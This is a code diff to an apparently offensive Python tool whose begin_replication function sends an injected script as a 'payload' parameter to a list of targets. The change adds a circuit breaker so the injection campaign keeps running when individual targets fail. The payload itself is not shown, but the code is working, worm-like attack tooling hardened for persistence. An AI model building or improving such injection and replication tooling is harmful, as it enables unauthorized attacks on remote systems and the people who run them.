@@ -8,6 +8,8 @@ from urllib.parse import urlparse
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
+from recon.resilience import CircuitBreakerRegistry
+
 # Load configuration from a JSON file
 def load_config(config_file):
     with open(config_file, 'r') as file:
@@ -65,13 +67,17 @@ def begin_replication(target, config):
 
         last_request_time = rate_limit(last_request_time, rate_limit_interval)
 
+        cb = CircuitBreakerRegistry.get(f"replication:{t}", failure_limit=3, timeout=300)
         try:
             params = {"payload": injected_script}
             print(f"[🧬] Injecting into: {t} with payload: {injected_script}")
             logging.info(f"Injecting into: {t} with payload: {injected_script}")
-            r = session.get(t, params=params, headers=headers, timeout=10)
+            r = cb.call(session.get, t, params=params, headers=headers, timeout=10)
             print(f"[+] Status {r.status_code} from {t}")
             logging.info(f"Status {r.status_code} from {t}")
+        except RuntimeError:
+            print(f"[🔌] Circuit OPEN for {t} — skipping this cycle")
+            logging.warning(f"Circuit OPEN for replication target {t}")
         except requests.exceptions.RequestException as e:
             print(f"[!] Failed to reach {t}: {e}")
             logging.error(f"Failed to reach {t}: {e}")
